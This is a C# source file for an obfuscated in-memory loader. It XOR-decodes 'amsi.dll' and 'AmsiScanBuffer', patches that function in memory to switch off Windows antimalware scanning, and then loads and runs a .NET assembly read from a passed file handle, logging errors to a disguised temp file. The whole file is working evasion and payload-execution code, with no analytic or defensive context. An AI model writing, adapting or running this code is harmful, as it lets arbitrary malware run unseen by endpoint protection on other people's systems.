using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;

internal class _0x
{
    [DllImport("kernel32")] static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr m, string n);
    [DllImport("kernel32")] static extern bool VirtualProtect(IntPtr a, uint s, uint p, out uint o);

    static string _d(byte[] b)
    {
        char[] c = new char[b.Length];
        for (int i = 0; i < b.Length; i++) c[i] = (char)(b[i] ^ 0x5A);
        return new string(c);
    }

    static void _k()
    {
        // XOR 0x5A encoded strings
        byte[] _n1 = { 0x3B, 0x37, 0x29, 0x33, 0x74, 0x3E, 0x36, 0x36 };
        byte[] _n2 = { 0x1B, 0x37, 0x29, 0x33, 0x09, 0x39, 0x3B, 0x34, 0x18, 0x2F, 0x3C, 0x3C, 0x3F, 0x28 };
        IntPtr _m = LoadLibrary(_d(_n1));
        if (_m == IntPtr.Zero) return;
        IntPtr _a = GetProcAddress(_m, _d(_n2));
        if (_a == IntPtr.Zero) return;
        uint _o;
        VirtualProtect(_a, 8, 0x40, out _o);
        byte[] _p8 = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        byte[] _p4 = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
        Marshal.Copy(IntPtr.Size == 8 ? _p8 : _p4, 0, _a, IntPtr.Size == 8 ? 6 : 8);
        VirtualProtect(_a, 8, _o, out _o);
    }

    static byte[] _r(long _h, int _s)
    {
        byte[] _b = new byte[_s];
        using (var _sf = new SafeFileHandle(new IntPtr(_h), false))
        using (var _fs = new FileStream(_sf, FileAccess.Read, 1 << 16))
        {
            int _o = 0;
            while (_o < _s)
            {
                int _c = _fs.Read(_b, _o, Math.Min(_s - _o, 1 << 16));
                if (_c <= 0) return null;
                _o += _c;
            }
        }
        return _b;
    }

    [STAThread]
    static int Main(string[] _a)
    {
        string _lp = Path.Combine(Path.GetTempPath(), "~kgerr.log");
        try
        {
            if (_a.Length < 3) { File.WriteAllText(_lp, "E1"); return 1; }
            long _h = long.Parse(_a[0]);
            int _s = int.Parse(_a[1]);
            string _ad = _a[2];
            if (_s <= 0 || _s > 0xBEBC200) return 1;

            byte[] _d2 = _r(_h, _s);
            if (_d2 == null) { File.WriteAllText(_lp, "E2"); return 1; }

            Environment.CurrentDirectory = _ad;
            _k();

            Assembly _asm = Assembly.Load(_d2);
            MethodInfo _ep = _asm.EntryPoint;
            if (_ep == null) { File.WriteAllText(_lp, "E3"); return 2; }

            _ep.Invoke(null, _ep.GetParameters().Length > 0
                ? new object[] { new string[0] } : null);
            return 0;
        }
        catch (Exception ex)
        {
            try { File.WriteAllText(_lp, ex.ToString()); } catch { }
            return 3;
        }
    }
}
